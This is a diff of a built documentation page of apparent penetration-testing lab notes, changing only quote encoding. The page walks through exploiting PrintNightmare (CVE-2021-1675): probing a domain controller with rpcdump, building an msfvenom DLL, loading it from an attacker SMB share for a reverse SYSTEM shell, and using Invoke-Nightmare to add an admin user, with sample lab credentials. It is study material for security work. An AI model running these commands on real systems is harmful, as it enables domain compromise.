@@ -26879,9 +26879,9 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <span class="normal"><a href="#__codelineno-2-2">2</a></span>
 <span class="normal"><a href="#__codelineno-2-3">3</a></span>
 <span class="normal"><a href="#__codelineno-2-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a><span class="c1"># We can use rpcdump.py to see if Print System Asynchronous Protocol and Print System Remote Protocol are exposed on the target.</span>
-</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2"></a>rpcdump.py<span class="w"> </span>@<span class="nv">$DomainControllerIP</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>egrep<span class="w"> </span><span class="s1">&#39;MS-RPRN|MS-PAR&#39;</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2"></a>rpcdump.py<span class="w"> </span>@<span class="nv">$DomainControllerIP</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>egrep<span class="w"> </span><span class="s1">'MS-RPRN|MS-PAR'</span>
 </span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3"></a><span class="c1"># Example:</span>
-</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4"></a><span class="c1"># rpcdump.py @172.16.5.5 | egrep &#39;MS-RPRN|MS-PAR&#39;</span>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4"></a><span class="c1"># rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'</span>
 </span></code></pre></div></td></tr></table></div>
 <p>After confirming this, we can proceed with attempting to use the exploit. We can begin by crafting a DLL payload using msfvenom.</p>
 <div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1">1</a></span>
@@ -26926,9 +26926,9 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2"></a>ssh<span class="w"> </span><span class="nv">$user</span>@<span class="nv">$ip</span>
 </span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3"></a>
 </span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4"></a><span class="c1"># Then we run the exploit:</span>
-</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5"></a>sudo<span class="w"> </span>python3<span class="w"> </span>/opt/CVE-2021-1675/CVE-2021-1675.py<span class="w"> </span><span class="nv">$user</span>/<span class="nv">$user</span>:<span class="nv">$password</span>@<span class="nv">$domainControllerIP</span><span class="w">  </span><span class="s1">&#39;\\$ipHostMachine\$ShareName\$filename.dll&#39;</span>
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5"></a>sudo<span class="w"> </span>python3<span class="w"> </span>/opt/CVE-2021-1675/CVE-2021-1675.py<span class="w"> </span><span class="nv">$user</span>/<span class="nv">$user</span>:<span class="nv">$password</span>@<span class="nv">$domainControllerIP</span><span class="w">  </span><span class="s1">'\\$ipHostMachine\$ShareName\$filename.dll'</span>
 </span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6"></a><span class="c1"># Example:</span>
-</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7"></a><span class="c1"># sudo python3 /opt/CVE-2021-1675/CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 &#39;\\172.16.5.225\CompData\backupscript.dll&#39;</span>
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7"></a><span class="c1"># sudo python3 /opt/CVE-2021-1675/CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'</span>
 </span></code></pre></div></td></tr></table></div>
 <p>The payload will then call back to our multi handler giving us an elevated SYSTEM shell.</p>
 <h2 id="calebstewart-powershell-exploit">calebstewart Powershell exploit</h2>
@@ -26960,7 +26960,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <p>Now we can import the PowerShell script <code>CVE-2021-1675.ps1</code> and use it to add a new local admin user.</p>
 <div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-11-1">1</a></span>
 <span class="normal"><a href="#__codelineno-11-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1"></a>Import-Module .\CVE-2021-1675.ps1
-</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2"></a>Invoke-Nightmare -NewUser &quot;hacker&quot; -NewPassword &quot;Pwnd1234!&quot; -DriverName &quot;PrintIt&quot;
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2"></a>Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"
 </span></code></pre></div></td></tr></table></div>
 <p><strong>Confirming New Admin User</strong>: If all went to plan, we will have a new local admin user under our control. Adding a user is "noisy," We would not want to do this on an engagement where stealth is a consideration. Furthermore, we would want to check with our client to ensure account creation is in scope for the assessment.</p>
 
